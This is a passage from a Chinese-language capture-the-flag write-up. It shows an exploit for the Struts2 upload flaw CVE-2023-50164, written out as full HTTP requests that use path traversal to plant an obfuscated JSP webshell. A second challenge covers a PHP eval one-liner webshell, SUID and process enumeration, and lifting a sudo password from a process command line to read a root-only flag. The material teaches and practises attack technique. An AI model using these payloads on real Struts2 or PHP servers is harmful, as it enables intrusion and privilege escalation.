	sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62)
	sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)
	java.lang.reflect.Method.invoke(Method.java:498)
	ognl.OgnlRuntime.invokeMethodInsideSandbox(OgnlRuntime.java:1245)
	ognl.OgnlRuntime.invokeMethod(OgnlRuntime.java:1230)
	ognl.OgnlRuntime.callAppropriateMethod(OgnlRuntime.java:1958)
	ognl.ObjectMethodAccessor.callMethod(ObjectMethodAccessor.java:68)
...
```

这里泄漏了后端使用了 **Apache Struts2** 框架，使用 `commons-io` 库来处理文件，并且暴露了Web 的绝对路径是 `/usr/local/tomcat/webapps/ROOT/`，所以这里我们可以利用利用 Struts2 的参数覆盖漏洞 (CVE-2023-50164)：

Struts2 有一个特性：它会自动将 HTTP 参数绑定到 Action 类的变量上。对于文件上传，通常会有三个变量：

1. `upload` (文件对象)
2. `uploadContentType` (文件类型)
3. `uploadFileName` (文件名)

**漏洞原理**：  
CVE-2023-50164 利用了 Struts2 的**参数解析逻辑缺陷**，攻击者可以通过构造特殊的 HTTP 请求，让 Struts2 **先设置正常的文件名，然后又被恶意参数覆盖**。

我们先随便上传个文件，抓住数据包：
```js
POST /upload.action HTTP/1.1
Host: challenge.shc.tf:31316
Content-Length: 200
Cache-Control: max-age=0
Origin: http://challenge.shc.tf:31316
Content-Type: multipart/form-data; boundary=----WebKitFormBoundarysGFDCPf3teSEInOj
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36
Connection: keep-alive

------WebKitFormBoundarysGFDCPf3teSEInOj
Content-Disposition: form-data; name="myfile"; filename="a.txt"
Content-Type: application/octet-stream

123

------WebKitFormBoundarysGFDCPf3teSEInOj--
```

可以看到，这里上传的文件表单的name字段值为`myfile`，我们将其修改为首字母大写的`Myfile`，然后在url里添加GET参数`?myfileFileName=../../../a.txt`

```js
POST /upload.action?myfileFileName=../../../a.txt HTTP/1.1
Host: challenge.shc.tf:31316
Content-Length: 200
Origin: http://challenge.shc.tf:31316
Content-Type: multipart/form-data; boundary=----WebKitFormBoundarysGFDCPf3teSEInOj
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36
Connection: keep-alive

------WebKitFormBoundarysGFDCPf3teSEInOj
Content-Disposition: form-data; name="Myfile"; filename="a.txt"
Content-Type: application/octet-stream

123

------WebKitFormBoundarysGFDCPf3teSEInOj--
```


- 这样，服务器接受到的 `name` 属性改为 **`Myfile`** (首字母大写)，而不是代码里定义的 `myfile`。
- **由于大小写不匹配**，Struts2 的文件上传拦截器（FileUpload Interceptor）虽然解析了文件内容，但**没有正确地将文件名绑定到 Action 的 `myfileFileName` 属性上**（或者绑定到了错误的临时变量）。
- 此时，Action 中的 `myfileFileName` 属性可能还是空的，或者被设为了默认值。
-
- 然后 Struts2 的参数拦截器（Parameters Interceptor）**会在文件上传拦截器之后运行**。当它扫描到这个 GET 参数 `myfileFileName`，发现 Action 类中正好有对应的 `setMyfileFileName()` 方法。
- 
- 于是，它**直接将 `../../../a.txt` 赋值给了 `myfileFileName` 属性**。

这样，路径穿越文件上传就发生了，此时我们直接访问`/a.txt`就能成功得到我们刚刚上传的 123 了，于是，我们就能直接上传木马，得到webshell。

```js
POST /upload.action?myfileFileName=../../../a.jsp HTTP/1.1
Host: challenge.shc.tf:31316
Content-Length: 912
Origin: http://challenge.shc.tf:31316
Content-Type: multipart/form-data; boundary=----WebKitFormBoundarypNlUA73qbyn6x9gd
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36
Connection: keep-alive

------WebKitFormBoundarypNlUA73qbyn6x9gd
Content-Disposition: form-data; name="Myfile"; filename="a.jsp"
Content-Type: application/octet-stream

<%@ page contentType="text/html;charset=UTF-8"  language="java" %>
<%
    if(request.getParameter("cmd")!=null){
        Class rt = Class.forName(new String(new byte[] { 106, 97, 118, 97, 46, 108, 97, 110, 103, 46, 82, 117, 110, 116, 105, 109, 101 }));
        Process e = (Process) rt.getMethod(new String(new byte[] { 101, 120, 101, 99 }), String.class).invoke(rt.getMethod(new String(new byte[] { 103, 101, 116, 82, 117, 110, 116, 105, 109, 101 })).invoke(null), request.getParameter("cmd") );
        java.io.InputStream in = e.getInputStream();
        int a = -1;byte[] b = new byte[2048];out.print("<pre>");
        while((a=in.read(b))!=-1){ out.println(new String(b)); }out.print("</pre>");
    }
%>
------WebKitFormBoundarypNlUA73qbyn6x9gd--

```

## sudoooo0

> 有shell了交个flag先

打开就是403，扫盘起手，得到`webshell.php` (dirsearch默认字典扫不出来)，返回空白页，接下来就是爆破参数(密码)，得到`cmd`，后台的木马就是简单的php一句话：`<?php @eval($_GET['cmd']);?>`，在根目录发现：

```bash

total 8
drwxr-xr-x.   1 root root  51 Feb 22 10:28 .
drwxr-xr-x.   1 root root  51 Feb 22 10:28 ..
lrwxrwxrwx.   1 root root   7 Nov  7 17:40 bin -> usr/bin
drwxr-xr-x.   2 root root   6 Nov  7 17:40 boot
drwxr-xr-x    5 root root 360 Feb 22 10:28 dev
-rwxr-xr-x.   1 root root 785 Dec 14 04:47 docker-entrypoint.sh
drwxr-xr-x.   1 root root  50 Feb 22 10:28 etc
-r--------.   1 root root  39 Feb 22 10:28 flag
drwxr-xr-x.   1 root root  17 Dec 14 04:47 home
lrwxrwxrwx.   1 root root   7 Nov  7 17:40 lib -> usr/lib
lrwxrwxrwx.   1 root root   9 Nov  7 17:40 lib64 -> usr/lib64
drwxr-xr-x.   2 root root   6 Dec  8 00:00 media
drwxr-xr-x.   2 root root   6 Dec  8 00:00 mnt
drwxr-xr-x.   2 root root   6 Dec  8 00:00 opt
dr-xr-xr-x. 666 root root   0 Feb 22 10:28 proc
drwx------.   2 root root  37 Dec  8 00:00 root
drwxr-xr-x.   1 root root  48 Feb 22 10:28 run
lrwxrwxrwx.   1 root root   8 Nov  7 17:40 sbin -> usr/sbin
drwxr-xr-x.   2 root root   6 Dec  8 00:00 srv
dr-xr-xr-x.  13 root root   0 Jan 30 15:57 sys
drwxrwxrwt.   1 root root   6 Feb 22 10:28 tmp
drwxr-xr-x.   1 root root  83 Dec  8 00:00 usr
drwxr-xr-x.   1 root root  17 Dec  8 22:42 var
```

很明显根目录下flag要提权，先查查SUID文件:

```bash
> find / -perm -u=s -type f 2>/dev/null

/usr/bin/chfn
/usr/bin/chsh
/usr/bin/gpasswd
/usr/bin/mount
/usr/bin/newgrp
/usr/bin/passwd
/usr/bin/su
/usr/bin/umount
/usr/bin/sudo
```

没有明显能利用提权的文件，再查查进程：
```bash
> ps -ef

UID          PID    PPID  C STIME TTY          TIME CMD
root           1       0  0 10:28 ?        00:00:00 apache2 -DFOREGROUND
ctf           25       1  0 10:28 ?        00:00:00 script -q -f -c bash -li -c "echo 0dy9e6 | sudo -S -v >/dev/null 2>&1; sleep infinity" /dev/null
ctf           26      25  0 10:28 pts/0    00:00:00 sleep infinity
ctf           55       1  0 10:29 ?        00:00:00 apache2 -DFOREGROUND
ctf           63       1  0 10:29 ?        00:00:00 apache2 -DFOREGROUND
ctf           82       1  0 10:32 ?        00:00:00 apache2 -DFOREGROUND
ctf           87       1  0 10:33 ?        00:00:00 apache2 -DFOREGROUND
ctf           88       1  0 10:33 ?        00:00:00 apache2 -DFOREGROUND
ctf           89       1  0 10:33 ?        00:00:00 apache2 -DFOREGROUND
ctf           90       1  0 10:33 ?        00:00:00 apache2 -DFOREGROUND
ctf           93       1  0 10:33 ?        00:00:00 apache2 -DFOREGROUND
ctf           98       1  0 10:36 ?        00:00:00 apache2 -DFOREGROUND
ctf           99       1  0 10:37 ?        00:00:00 apache2 -DFOREGROUND
ctf          127      88  0 10:46 ?        00:00:00 sh -c -- ps -ef
ctf          128     127  0 10:46 ?        00:00:00 ps -ef
```

很明显，这里 PID 为 25 的进程：
- `script -q -f -c bash -li -c "echo 0dy9e6 | sudo -S -v >/dev/null 2>&1; sleep infinity" /dev/null`

`echo 0dy9e6 | sudo -S -v`直接写明了sudo密码为`0dy9e6`，配合`-S`参数允许sudo从管道接受密码，我们就能直接得到root权限了。但是注意，因为sudo会新开shell，system函数得不到这个结果，所以我们仿照这段命令，使用script命令得到全部的输出：`script -q -c "echo 0dy9e6 | sudo -S cat /flag"`。

> ```bash
> > tldr script
> Record all terminal output to a typescript file.
> ```